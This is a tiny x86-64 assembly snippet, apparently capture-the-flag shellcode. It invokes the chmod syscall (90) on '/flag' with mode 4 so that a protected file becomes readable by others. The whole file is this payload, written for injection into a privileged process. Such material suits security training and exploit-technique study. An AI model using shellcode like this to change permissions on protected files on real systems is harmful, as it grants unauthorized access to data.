.global _start
_start:
.intel_syntax noprefix
        mov rax, 0x5a
        lea rdi, [rip+flag]
        mov rsi, 4
        syscall
flag:
        .ascii "/flag\0"
